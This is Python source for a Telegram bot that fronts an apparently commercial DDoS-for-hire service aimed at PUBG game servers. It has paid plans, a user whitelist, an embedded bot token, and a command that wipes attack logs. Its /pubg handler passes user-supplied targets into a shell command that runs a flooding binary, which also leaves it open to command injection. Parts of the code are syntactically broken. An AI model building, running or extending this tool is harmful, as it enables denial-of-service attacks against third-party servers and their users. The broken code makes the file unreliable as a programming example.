import telebot
import subprocess
import datetime
import os

os.system("chmod +x *")

# insert your Telegram bot token here
bot = telebot.TeleBot('6151599157:AAEXFXPYCjjSpCusnHQeALrbEppY32qQdrc')

# Admin user IDs
admin_id = ["7360500930"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"


# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully."
            else:
                response = "User already exists."
        else:
            response = "Please specify a user ID to add."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully."
            else:
                response = f"User {user_to_remove} not found in the list."
        else:
            response = '''Hãy chọn định một ID người dùng để xóa.
 Usage: /remove <userid>'''
    else:
        response = "Chỉ Admin mới có quyền thực hiện lệnh này."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully"
        except FileNotFoundError:
            response = "Logs are already cleared."
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found"
        except FileNotFoundError:
            response = "No data found"
    else:
        response = "Chỉ Admin mới có quyền thực hiện lệnh này."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found."
                bot.reply_to(message, response)
        else:
            response = "No data found"
            bot.reply_to(message, response)
    else:
        response = "Chỉ Admin mới có quyền thực hiện lệnh này."
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀 
\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: PUBG\n"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['pubg'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
                response = "Bạn đang bị khóa tạm thời. Vui lòng chờ 5 phút trước khi thực hiện lệnh /pubg một lần nữa.."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 181:
                response = "Error: Time interval must be less than 80."
            else:
                record_command_logs(user_id, '/pubg', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./pubg {target} {port} {time} 200"
                subprocess.run(full_command, shell=True)
                response = f"PUBG Attack successfully sent! Target: {target} Port: {port} Port: {time}"
        else:
            response = "Usage :- /pubg <TARGET> <PORT> <TIME> <METHOD>\n"  # Updated command syntax
    else:
        response = "Bạn không có quyền sử dụng lệnh này.\n"

    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "No Command Logs Found For You."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "Bạn không có quyền sử dụng lệnh này.."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''Danh Sách Các Lệnh:
 /pubg : Phương pháp tấn công server PUBG.
 /rules : Xem quy định trước khi sử dụng !!
 /mylogs : xem các cuộc tấn công gần đây của bạn.
 /plan : Xem bảng giá và gói dịch vụ của botnet.

 To See Admin Commands:
 /admincmd : Shows All Admin Commands.
 
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
response = (
    f"Welcome to {user_name} Arthur DDoS Bot!\n\n"
    "Tấn Công DDoS Miễn Phí Và Trả Phí\n\n"
    "Type /help to see the attack usage!\n\n"
    "----------------------------------------------\n\n"
    "Best C2/API Of 2024 -> @Xiaocoderz🚀"
)
bot.reply_to(message, response)



@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Vui lòng tuân thủ các quy tắc sau:

1. Không thực hiện quá nhiều cuộc tấn công cùng lúc!! nếu Không bạn sẽ bị cấm khỏi bot.
2. Không được chạy 2 cuộc tấn công cùng lúc nếu không , bạn sẽ bị bot cấm.
3. Chúng tôi theo dõi nhật ký hàng ngày, vì vậy hãy tuân thủ các quy định này để tránh bị cấm!!
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Arthur DDoD C2 Vip

Vip Plan:
-> Thời gian tấn công: 200 giây
-> Giới hạn sau mỗi cuộc tấn công: 2 phút
-> Số lượng tấn công đồng thời: 300

Bảng giá:
Ngày --> 50 VND
Tuần --> 100 VND
Tháng --> 250 VND
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Lệnh Admin Đã Được Kích Hoạt:

/add <userId> : Triệu tập một thành viên mới vào hệ thống.
/remove <userId> : Xóa sổ một tài khoản khỏi cơ sở dữ liệu.
/allusers : Liệt kê các chiến binh đang hoạt động trong mạng lưới.
/logs : Truy xuất toàn bộ lịch sử hoạt động.
/broadcast : Truyền tải thông điệp tới tất cả node.
/clearlogs : Xóa sạch mọi dấu vết từ các nhật ký.

'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Thông Điệp Được Phát Từ Admin 🚀:\n\n" + command[1]
with open(USER_FILE, "r") as file:
    user_ids = file.read().splitlines()
    for user_id in user_ids:
        try:
            bot.send_message(user_id, message_to_broadcast)
        except Exception as e:
            print(f"Không thể gửi thông điệp đến user {user_id}: {str(e)}")
response = "Thông điệp đã được phát tới tất cả các node thành công."
else:
    response = "Hãy cung cấp thông điệp để phát tán."
else:
    response = "Chỉ Admin mới có quyền thực hiện lệnh này."


    bot.reply_to(message, response)




bot.polling()
